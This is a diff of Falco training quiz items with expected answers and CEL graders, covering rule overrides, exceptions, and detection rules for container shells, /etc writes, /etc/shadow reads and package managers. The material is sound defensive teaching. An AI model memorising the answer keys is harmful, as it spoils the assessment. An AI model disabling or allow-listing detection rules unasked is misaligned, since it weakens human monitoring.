+          priority: CRITICAL
+          override:
+            priority: replace
+        ```
+
+        For a **rule**, `replace` may change `condition`, `output`, `desc`, `priority`, `tags`, `exceptions`,
+        `enabled`; `append` may extend `condition`, `output`, `desc`, `tags` and `exceptions` (but not
+        `priority`, which cannot be appended). Only *one* of `append` or `replace` may be used per key
+        group. The older alternative still works: **copy the full rule** into the local file with the same
+        name and change it — the later definition replaces the earlier one.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+- title: Changing a Rule's Output Format
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A parser expects the alerts of `Terminal shell in container` to look **exactly** like this, with
+      no other text: the time of the event, the numeric user id and the process name, separated by
+      commas without spaces.
+
+      `10:52:07.123456789,0,sh`
+
+      (Falco adds the usual `<time>: <Priority>` prefix on its own.) Keep the rule's condition and
+      priority as they are.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Terminal shell in container
+          output: "%evt.time,%user.uid,%proc.name"
+          override:
+            output: replace
+      header: Write the content of /etc/falco/falco_rules.local.yaml.
+      hint: Fields in an output string are written with a percent sign in front, and the output must be replaced, not extended.
+      correctAnswerInfo: 'Do not forget the quotes when the value starts with a percent sign: YAML treats a bare leading %
+        as a directive character in some positions.'
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Terminal shell in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*output:\s*[\x27"]?%evt\.time,%user\.uid,%proc\.name[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(override:\s*(\n\s+|\{\s*)output:\s*replace)|(\n\s+condition:)')) &&
+        (!answer.matches(r'priority:')) &&
+        (!answer.matches(r'output:\s*append'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Output strings use `%field` placeholders. The usual fields:
+
+        | Field | Meaning |
+        |---|---|
+        | `%evt.time` | time of the event |
+        | `%user.name`, `%user.uid` | user name and numeric id |
+        | `%proc.name`, `%proc.cmdline` | process name, full command line |
+        | `%fd.name` | file or connection |
+        | `%container.name`, `%container.image.repository` | container and image |
+        | `%k8s.pod.name`, `%k8s.ns.name` | Pod and namespace |
+
+        When a format is **graded exactly**, copy it character by character: separators, spacing and field
+        order all count. `override: output: replace` swaps the whole string; `append` would add to the
+        original text.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+      - url: https://falco.org/docs/concepts/outputs/formatting/
+        text: Alert formatting
+- title: Extending the Output of a Default Rule
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The default rule `Read sensitive file untrusted` already prints what was read and by whom, which
+      you want to keep. For this **one rule only**, add `container=<name> pod=<pod> ns=<namespace>` to the
+      **end** of its existing output (with a leading space).
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Read sensitive file untrusted
+          output: " container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name"
+          override:
+            output: append
+      header: Write the content of /etc/falco/falco_rules.local.yaml.
+      hint: You want to add text to the existing output, not replace it.
+      correctAnswerInfo: The leading space inside the quotes keeps the appended text separated from the original output.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Read sensitive file untrusted[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*output:\s*[\x27"]?\s*container=%container\.name pod=%k8s\.pod\.name ns=%k8s\.ns\.name')) &&
+        (answer.matches(r'override:\s*(\n\s+|\{\s*)output:\s*append'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        `override: output: append` concatenates your text to the original output string — useful to keep
+        a default format and add context. Compare:
+
+        | Override | Result |
+        |---|---|
+        | `output: replace` | the new string is the whole output |
+        | `output: append` | the new string is added at the end of the old one |
+
+        `append_output` in `falco.yaml` does the same for many rules at once.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+- title: Disabling a Default Rule
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The default rule `Read sensitive file untrusted` is too noisy on `node01`. You may not edit
+      `falco_rules.yaml` and do not want to delete anything: **disable the rule** from your local
+      customisation file.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Read sensitive file untrusted
+          enabled: false
+          override:
+            enabled: replace
+      header: Write the content of /etc/falco/falco_rules.local.yaml.
+      hint: A rule has a property that switches it on or off.
+      correctAnswerInfo: 'Both forms disable the rule. The one with override.enabled: replace is the current, preferred syntax;
+        a bare ''enabled: false'' as the only field still works as a legacy shorthand.'
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Read sensitive file untrusted[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?enabled:\s*false\s*($|\n|#)')) &&
+        (!answer.matches(r'enabled:\s*true'))
+  - type: context
+    text: |
+      A second default rule, `Terminal shell in container`, must also go — but this time you want to do
+      it from **falco.yaml**, through the section that enables and disables rules by name, without
+      touching any rules file.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        rules:
+          - disable:
+              rule: "Terminal shell in container"
+      header: Write that setting for /etc/falco/falco.yaml.
+      hint: The section is a list of commands; each entry names an action and what it applies to (a rule name or a tag).
+      correctAnswerInfo: 'Entries are evaluated in order and may use wildcards, for example disable: rule: "*" followed by
+        enable entries for the rules you want.'
+      cel: |-
+        (answer.matches(r'(^|\n)rules:\s*(\n|$)')) &&
+        (answer.matches(r'-\s*disable:\s*\n\s+rule:\s*[\x27"]?Terminal shell in container[\x27"]?\s*($|\n)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Ways to turn a default rule off without deleting it:
+
+        1. In a later rules file: `enabled: false` with `override: enabled: replace` (shown above).
+        2. In `falco.yaml` (Falco 0.38+): a `rules:` list of `enable`/`disable` entries by **rule name**
+           (wildcards allowed) or by **tag**; also available on the command line as
+           `-o "rules[].disable.rule=..."`. The old `-D` option no longer exists.
+        3. Many default rules expose a `user_*` macro; overriding it with `(always_true)`/`(never_true)`
+           style conditions changes what the rule matches (see the next scenario).
+
+        Remember that Falco applies the change when it (re)starts.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/controlling-rules/
+        text: Controlling rules
+- title: Allow-listing with a User Macro
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Operators legitimately open shells in containers of the image `registry.example/debug-tools`.
+      The default rule `Terminal shell in container` already contains a hook for exactly this: the
+      macro `user_expected_terminal_shell_in_container_conditions`, which is defined as `(never_true)`
+      (so nothing is excluded) and used as `and not user_expected_terminal_shell_in_container_conditions`.
+
+      Make that macro true for containers whose image repository is `registry.example/debug-tools`,
+      without redefining the rule.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - macro: user_expected_terminal_shell_in_container_conditions
+          condition: (container.image.repository = registry.example/debug-tools)
+          override:
+            condition: replace
+      header: Write the content of /etc/falco/falco_rules.local.yaml.
+      hint: The macro keeps its name; you give it a new condition. The rule already negates it.
+      correctAnswerInfo: Because the rule says 'and not <macro>', a macro that is true for the debug image suppresses the
+        alert exactly for those containers. Defining a macro again later in the load order replaces the earlier definition.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*macro:\s*user_expected_terminal_shell_in_container_conditions\s*($|\n)')) &&
+        (answer.matches(r'condition:[^\n]*container\.image\.repository\s*(=|==|startswith|in)[^\n]*registry\.example/debug-tools')) &&
+        (!answer.matches(r'condition:\s*or\b')) &&
+        (!answer.matches(r'condition:\s*append'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Most default rules offer one or more **`user_*` macros** as official tuning points:
+
+        ```yaml
+        - macro: user_expected_terminal_shell_in_container_conditions
+          condition: (never_true)               # shipped default: excludes nothing
+        ```
+
+        Override it (in a later file) to describe the cases you consider normal. With `override:
+        condition: replace` you swap the definition; with `append` you would *add* to the existing one
+        (the text is concatenated, so start it with `or`/`and`, and beware of operator precedence — wrap
+        the original in parentheses).
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+      - url: https://falco.org/docs/concepts/rules/controlling-rules/
+        text: Controlling rules
+- title: Spotting and Updating the Old Append Syntax
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      An older tutorial gave you this `falco_rules.local.yaml`. It uses the **legacy `append: true`**
+      key, which Falco has deprecated and will remove in 1.0. It adds `fish` to the list of shells and
+      narrows the shell rule for one image.
+  - type: manifest
+    header: /etc/falco/falco_rules.local.yaml
+    content: |
+      - list: shell_binaries
+        items: [fish]
+        append: true
+
+      - rule: Terminal shell in container
+        condition: and not container.image.repository = registry.example/debug-tools
+        append: true
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - list: shell_binaries
+          items: [fish]
+          override:
+            items: append
+
+        - rule: Terminal shell in container
+          condition: and not container.image.repository = registry.example/debug-tools
+          override:
+            condition: append
+      header: Rewrite the file in the current override syntax, keeping exactly the same effect.
+      hint: The new section sits inside each item and names the key that is being extended, together with the action.
+      correctAnswerInfo: Lists are extended through their 'items', rules and macros through their 'condition'. Because append
+        just concatenates text, the appended condition starts with 'and'.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*list:\s*shell_binaries\s*($|\n)')) &&
+        (answer.matches(r'items:\s*\[\s*fish\s*\]|items:\s*\n\s*-\s*fish')) &&
+        (answer.matches(r'override:\s*(\n\s+|\{\s*)items:\s*append')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Terminal shell in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'condition:\s*and not container\.image\.repository\s*=\s*registry\.example/debug-tools')) &&
+        (answer.matches(r'override:\s*(\n\s+|\{\s*)condition:\s*append')) &&
+        (!answer.matches(r'append:\s*true'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Old and new form side by side:
+
+        | Old (deprecated) | Current |
+        |---|---|
+        | `append: true` on a list | `override:` → `items: append` |
+        | `append: true` on a macro/rule | `override:` → `condition: append` |
+        | `enabled: false` as the only field | `override:` → `enabled: replace` |
+        | redefining a whole object | `override:` with `replace` on the keys you change |
+
+        You will still meet the old form in blog posts and older exam material, so recognise it — but
+        write the new one. Also note: `append` and `replace` cannot be mixed for the same item.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+- title: Reading Rule Exceptions
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A rule in `/etc/falco/rules.d/binary-writes.yaml` carries an **`exceptions`** section. The rule
+      fires on writes to files below the binary directories; the exceptions list the cases that must
+      **not** raise an alert.
+  - type: manifest
+    header: /etc/falco/rules.d/binary-writes.yaml
+    content: |
+      - rule: Write below binary dir
+        desc: an attempt to write to any file below a set of binary directories
+        condition: open_write and bin_dir
+        output: File below a known binary directory opened for writing (user=%user.name file=%fd.name proc=%proc.name)
+        priority: ERROR
+        exceptions:
+          - name: proc_writer
+            fields: [proc.name, fd.directory]
+            comps: [=, =]
+            values:
+              - [my-custom-yum, /usr/bin]
+              - [my-custom-apt, /usr/local/bin]
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: 'no'
+      header: The package manager my-custom-yum writes the file /usr/bin/tool. Does the rule raise an alert? (yes or no)
+      hint: Compare the process name and the directory with the pairs under values.
+      cel: answer.lowerAscii().trim() in ['no', 'n']
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: 'yes'
+      header: The package manager my-custom-apt writes the file /usr/bin/tool. Does the rule raise an alert? (yes or no)
+      hint: Each entry in values is a pair that must match both fields at the same time.
+      correctAnswerInfo: 'The pair for my-custom-apt is /usr/local/bin, not /usr/bin: a tuple matches only when every field
+        matches its own value, so this write is not excepted.'
+      cel: answer.lowerAscii().trim() in ['yes', 'y']
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: values
+      header: Which key of an exception holds the list of tuples that suppress the alert?
+      cel: answer.trim() == 'values'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        An exception is a **named set of fields** plus **tuples of values** that are allowed:
+
+        ```yaml
+        exceptions:
+          - name: proc_writer
+            fields: [proc.name, fd.directory]   # which fields are compared
+            comps:  [=, =]                       # how each field is compared (=, in, startswith, ...)
+            values:                              # each entry is one allowed combination
+              - [my-custom-yum, /usr/bin]
+        ```
+
+        A tuple excepts an event only if **all** fields match. Exceptions are the structured replacement
+        for the long chains of `and not ...` that older rule files used, and you can add to them from
+        another file with `override: exceptions: append`. You will meet them mainly when *reading* default
+        rules, so be able to tell what they exclude.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/exceptions/
+        text: Rule exceptions
+- title: 'A Rule: A Shell Starts in Any Container'
+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Write a **new rule** for `/etc/falco/rules.d/shell.yaml` on `node01`. The default rules file is
+      loaded first, so its macros and lists are available to you.
+
+      - Name: `Shell in my containers`
+      - It must fire whenever a **shell process is started inside a container** (not on the host).
+      - Priority: `WARNING`.
+      - The alert text must name the user, the container name, the image repository, the Pod, the
+        namespace and the full command line, as `user=… container=… image=… pod=… ns=… cmd=…`.
+      - Every rule needs a description.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Shell in my containers
+          desc: A shell was started inside a container
+          condition: spawned_process and container and proc.name in (shell_binaries)
+          output: Shell started in container (user=%user.name container=%container.name image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name cmd=%proc.cmdline)
+          priority: WARNING
+      header: Write the content of /etc/falco/rules.d/shell.yaml.
+      hint: 'Think of the three questions a condition answers: what happened (an event), where (container or host), and who
+        did it (which process names). The default rules already define a macro or list for each.'
+      correctAnswerInfo: spawned_process (a macro for execve/execveat), container (container.id != host) and the list shell_binaries
+        all come from falco_rules.yaml, which is why the load order matters.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Shell in my containers[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:WARNING)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.image\.repository\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.pod\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.ns\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.cmdline\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])spawned_process($|[\s)])|evt\.type\s*(=|==)\s*execve|evt\.type\s+in\s*\([^)]*execve')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'shell_procs|proc\.name\s+in\s*\(\s*shell_binaries\s*\)|proc\.name\s*(=|==)\s*[\x27"]?(sh|bash|zsh|dash|ash)\b|proc\.name\s+in\s*\([^)]*\b(sh|bash)\b'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        A complete rule has **`rule`, `desc`, `condition`, `output`, `priority`** (and optionally `tags`,
+        `enabled`, `exceptions`):
+
+        ```yaml
+        - rule: Shell in my containers
+          desc: A shell was started inside a container
+          condition: spawned_process and container and proc.name in (shell_binaries)
+          output: >
+            Shell started in container (user=%user.name container=%container.name
+            image=%container.image.repository pod=%k8s.pod.name ns=%k8s.ns.name cmd=%proc.cmdline)
+          priority: WARNING
+        ```
+
+        The three building blocks of a condition: an **event** (`spawned_process`, or `evt.type in (execve,
+        execveat)`), a **scope** (`container`, i.e. `container.id != host`) and a **filter**
+        (`proc.name in (shell_binaries)`). `macro`s name reusable condition fragments, `list`s name
+        reusable value lists.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/basic-elements/
+        text: 'Falco rules: basic elements'
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+      - url: https://falco.org/docs/concepts/rules/style-guide/
+        text: Rules style guide
+- title: 'A Rule: Writes Below /etc in a Container'
+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Write a new rule named `Write below etc in container` for `/etc/falco/rules.d/etc-writes.yaml`:
+
+      - it fires when a process **inside a container opens a file for writing** anywhere below `/etc`
+      - priority `ERROR`
+      - the alert text must contain the user name, the file name, the process name and the container
+        name
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Write below etc in container
+          desc: A container process opened a file below /etc for writing
+          condition: open_write and container and fd.name startswith /etc
+          output: File opened for writing below /etc in a container (user=%user.name file=%fd.name process=%proc.name container=%container.name)
+          priority: ERROR
+      header: Write the content of /etc/falco/rules.d/etc-writes.yaml.
+      hint: The default rules define a macro for 'a file was opened for writing'. For the location, compare the file name
+        with a path prefix.
+      correctAnswerInfo: 'open_write is a macro in falco_rules.yaml: (evt.type in (open, openat, openat2) and evt.is_open_write=true
+        and fd.typechar=''f'' and fd.num>=0).'
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Write below etc in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:ERROR)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%fd\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])open_write($|[\s)])|evt\.type\s+in\s*\([^)]*open[^)]*\)\s+and\s+evt\.is_open_write\s*=\s*true')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'fd\.name\s+(startswith|pmatch)\s*\(?\s*[\x27"]?/etc|fd\.directory\s*(=|==|startswith|in|pmatch)\s*\(?\s*[\x27"]?/etc'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        File-related rules combine an **open event with the right direction** and a **path test**:
+
+        | Need | Building block |
+        |---|---|
+        | opened for writing | `open_write` (macro) or `evt.type in (open, openat, openat2) and evt.is_open_write=true` |
+        | opened for reading | `open_read` |
+        | below a directory | `fd.name startswith /etc`, or `fd.name pmatch (/etc)`, or `fd.directory = /etc` (one level only) |
+        | inside a container | `container` |
+
+        Mind the difference: `fd.directory = /etc` matches only files **directly** in `/etc`, whereas
+        `startswith` and `pmatch` also match subdirectories. `pmatch` compares whole path components, so
+        `/etc` does not match `/etcetera`.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+      - url: https://falco.org/docs/reference/rules/supported-fields/
+        text: Supported fields
+- title: 'A Rule: The Shadow File Is Read'
+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Write a new rule named `Read shadow in container` for `/root/shadow-rule.yaml`:
+
+      - it fires when a process **in a container opens `/etc/shadow` for reading**
+      - priority `WARNING`
+      - the alert text must contain the user name, the process name, the file name, the container name
+        and the Pod name
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Read shadow in container
+          desc: The shadow password file was read inside a container
+          condition: open_read and container and fd.name = /etc/shadow
+          output: Sensitive file read in container (user=%user.name process=%proc.name file=%fd.name container=%container.name pod=%k8s.pod.name)
+          priority: WARNING
+      header: Write the content of /root/shadow-rule.yaml.
+      hint: 'Mirror the previous scenario: same scope, the opposite direction, and an exact path instead of a prefix.'
+      correctAnswerInfo: The default rule Read sensitive file untrusted covers /etc/shadow too, but its exclusions and wording
+        differ; a dedicated rule is simple and explicit.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Read shadow in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:WARNING)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%fd\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.pod\.name\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])open_read($|[\s)])|evt\.type\s+in\s*\([^)]*open[^)]*\)\s+and\s+evt\.is_open_read\s*=\s*true')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'fd\.name\s*(=|==)\s*[\x27"]?/etc/shadow[\x27"]?|fd\.name\s+in\s*\(\s*[\x27"]?/etc/shadow[\x27"]?\s*\)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Exact-path rules use equality on `fd.name`: `fd.name = /etc/shadow`, or a set with `in`:
+        `fd.name in (/etc/shadow, /etc/sudoers)`. Write paths **without** shell quoting; quote only when
+        the value contains spaces or special characters (`fd.name = "/path with space"`).
+
+        Make sure the rule uses `open_read`, not `open_write`: a rule that watches the wrong direction
+        validates fine and silently never fires — test it (see the foreground-test scenario).
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+- title: 'A Rule: A Package Manager Runs in a Container'
+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Containers should be immutable, so installing software at runtime is suspicious. Write a rule
+      named `Package manager in container` for `/etc/falco/rules.d/packages.yaml`:
+
+      - it fires when a process named **`apt`, `apk` or `yum`** is started inside a container
+      - priority `NOTICE`
+      - the alert text must contain the user name, the full command line, the container name and the
+        image repository
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Package manager in container
+          desc: A package manager was started inside a container
+          condition: spawned_process and container and proc.name in (apt, apk, yum)
+          output: Package manager run in container (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
+          priority: NOTICE
+      header: Write the content of /etc/falco/rules.d/packages.yaml.
+      hint: Same structure as the shell rule; only the list of process names changes.
+      correctAnswerInfo: The default rules define package_mgmt_binaries (a long list of package-manager names); here the task
+        names the three binaries explicitly.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Package manager in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:NOTICE)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.cmdline\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.image\.repository\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])spawned_process($|[\s)])|evt\.type\s*(=|==)\s*execve|evt\.type\s+in\s*\([^)]*execve')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]apt[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?apt[\x27"]?(\s|\)|$)')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]apk[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?apk[\x27"]?(\s|\)|$)')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]yum[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?yum[\x27"]?(\s|\)|$)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Process-based rules always start with the **spawn event**, then the scope, then the names:
+
+        ```yaml
+        condition: spawned_process and container and proc.name in (apt, apk, yum)
+        ```
+
+        `proc.name` is the executable's name (truncated to 15 characters), `proc.exepath` its full path
+        and `proc.cmdline` the full command line. If you want to match on arguments, use
+        `proc.cmdline contains "install"` (or `proc.cmdline contains anyof (install, add)` in Falco
+        0.44+).
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+- title: 'A Rule: A Specific Binary Runs in a Container'
